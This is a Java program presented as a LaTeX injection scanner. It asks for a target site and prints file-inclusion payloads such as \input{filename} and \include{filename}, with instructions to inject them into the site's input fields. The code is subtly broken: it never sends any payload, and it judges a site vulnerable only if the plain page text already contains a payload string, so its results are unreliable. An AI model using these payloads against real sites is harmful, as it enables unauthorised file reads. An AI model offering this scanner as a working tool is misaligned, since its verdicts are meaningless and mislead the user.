import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class LatexInjectionTester {
    public static void main(String[] args) {
        System.out.println("\033[0;34m");
        System.out.println("=============================================");
        System.out.println("     LaTeX Injection Vulnerability Tester");
        System.out.println("=============================================\n");
        System.out.println("\033[0m");

        // Get the target website URL from the user
        String targetURL = getTargetURLFromUser();
        
        // Test for LaTeX Injection vulnerability
        boolean isVulnerable = testForVulnerability(targetURL);
        
        // Display vulnerability status and testing instructions
        if (isVulnerable) {
            System.out.println("\033[0;31m");
            System.out.println("The target website is vulnerable to LaTeX Injection!");
            System.out.println("\033[0m");
            System.out.println("To test the vulnerability, try injecting one of the following payloads in a text input field:");
            System.out.println("1. \\documentclass{article}\\usepackage{amsmath}\\begin{document}\\Huge{\\LaTeX}\\end{document}");
            System.out.println("2. \\input{filename}");
            System.out.println("3. \\include{filename}");
            System.out.println("\nSensitive Information Detected in Response:");
            System.out.println("\033[0;31m");
            System.out.println("Sensitive information could be highlighted here...");
            System.out.println("\033[0m");
        } else {
            System.out.println("\033[0;32m");
            System.out.println("The target website is not vulnerable to LaTeX Injection.");
            System.out.println("\033[0m");
        }
    }

    private static String getTargetURLFromUser() {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        String targetURL = "";
        try {
            System.out.println("Enter your target website URL: ");
            targetURL = reader.readLine();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return targetURL;
    }

    private static boolean testForVulnerability(String targetURL) {
        List<String> payloads = new ArrayList<>();
        payloads.add("\\documentclass{article}\\usepackage{amsmath}\\begin{document}\\Huge{\\LaTeX}\\end{document}");
        payloads.add("\\input{filename}");
        payloads.add("\\include{filename}");

        boolean isVulnerable = false;
        for (String payload : payloads) {
            try {
                URL url = new URL(targetURL);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Check if the response contains vulnerable LaTeX keywords
                    BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    String inputLine;
                    while ((inputLine = in.readLine()) != null) {
                        // Log response content
                        System.out.println("Response: " + inputLine);
                        
                        // Check if the response contains sensitive information
                        if (inputLine.contains("password") || inputLine.contains("credit_card") || inputLine.contains("social_security_number")) {
                            System.out.println("\033[0;31m" + inputLine + "\033[0m");
                        }
                        
                        // Check if the payload runs successfully
                        if (inputLine.contains(payload)) {
                            isVulnerable = true;
                            System.out.println("\033[0;33m" + "Payload successful: " + inputLine + "\033[0m");
                        }
                    }
                    in.close();
                    if (isVulnerable) {
                        break; // Exit the loop if vulnerability is found
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return isVulnerable;
    }
}
